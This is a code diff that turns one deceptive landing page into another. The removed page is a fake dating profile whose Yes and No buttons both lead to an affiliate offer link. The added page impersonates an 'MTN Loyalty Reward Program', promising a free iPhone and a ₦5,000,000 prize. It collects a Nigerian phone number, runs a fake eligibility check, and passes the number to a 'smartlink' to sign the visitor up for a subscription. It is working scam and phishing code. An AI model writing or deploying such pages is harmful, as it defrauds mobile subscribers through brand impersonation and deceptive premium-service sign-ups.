@@ -1,95 +1,116 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Would You Date Me?</title>
+  <title>Loyalty Reward Program</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
       background: #f9f9f9;
-      display: flex;
-      justify-content: center;
-    }
-    .profile-card {
-      max-width: 420px;
-      width: 100%;
-      margin: 20px;
-      background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-      overflow: hidden;
-    }
-    .profile-photo {
-      width: 100%;
-      height: 360px;
-      background-image: url('https://i.postimg.cc/cJ2b58fw/RDT-20250803-0259265921380149435635900.webp');
-      background-size: cover;
-      background-position: center;
-    }
-    .info {
-      padding: 22px;
-      text-align: center;
-    }
-    .name {
-      font-size: 22px;
-      font-weight: 700;
-      color: #222;
-    }
-    .location {
-      color: #777;
-      margin-top: 4px;
-      font-size: 14px;
-    }
-    .question {
-      margin: 20px 0;
-      font-size: 20px;
-      color: #444;
-    }
-    .buttons {
-      display: flex;
-      justify-content: center;
-      gap: 16px;
-      margin-top: 15px;
-    }
-    .btn {
-      padding: 12px 28px;
-      font-size: 16px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    .btn-yes {
-      background: #ff3366;
-      color: white;
-    }
-    .btn-no {
-      background: #ddd;
+      margin: 0;
+      padding: 0;
       color: #333;
     }
-    .likes {
-      font-size: 14px;
-      color: #888;
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+    .header {
+      text-align: center;
+    }
+    .header h1 {
+      font-size: 22px;
+      color: #f7b500;
+    }
+    .subtext {
+      font-size: 15px;
       margin-top: 10px;
+      text-align: center;
+    }
+    .input-group {
+      margin-top: 30px;
+    }
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background: #f7b500;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .loading-screen, .popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.9);
+      color: #fff;
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 20px;
+      text-align: center;
+    }
+    .popup button {
+      margin-top: 20px;
+      background: #25d366;
     }
   </style>
 </head>
 <body>
-
-  <div class="profile-card">
-    <div class="profile-photo"></div>
-    <div class="info">
-      <div class="name">Mimi, 23</div>
-      <div class="location">📍 Toronto, Canada</div>
-      <div class="question">Would you date me? 😘</div>
-      <div class="buttons">
-        <button class="btn btn-yes" onclick="window.location.href='https://www.gravelroat.info/click?offer_id=32138&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE'">Yes ❤️</button>
-        <button class="btn btn-no" onclick="window.location.href='https://www.gravelroat.info/click?offer_id=32138&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE'">No</button>
+  <div class="container">
+    <div class="header">
+      <h1>MTN Loyalty Reward Program</h1>
+      <div class="subtext">
+        You may be eligible to win a free iPhone 14 Pro Max. Enter your number below to check eligibility.
       </div>
-      <div class="likes">💖 24 people recently liked this</div>
     </div>
-  </div>
+    <div class="input-group">
+      <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
+      <button onclick="startCheck()">Check Eligibility</button>
+    </div>
+  </div>  <div class="loading-screen" id="loading">
+    <h2>Checking your eligibility...</h2>
+  </div>  <div class="popup" id="result">
+    <h2>Sorry 😢</h2>
+    <p>You did not qualify for the iPhone giveaway.<br>
+    But you have qualified for our ₦5,000,000 cash prize reward 🎉</p>
+    <button onclick="redirectToOffer()">Enter your number to subscribe and claim</button>
+  </div>  <script>
+    function startCheck() {
+      const number = document.getElementById('msisdn').value;
+      if (!/^0[789][01]\d{8}$/.test(number)) {
+        alert('Please enter a valid 11-digit Nigerian number');
+        return;
+      }
+      document.getElementById('loading').style.display = 'flex';
+      setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('result').style.display = 'flex';
+      }, 4000);
+    }
 
-</body>
+    function redirectToOffer() {
+      const number = document.getElementById('msisdn').value;
+      // Smartlink will detect MTN or Airtel automatically
+      window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
+    }
+  </script></body>
 </html>
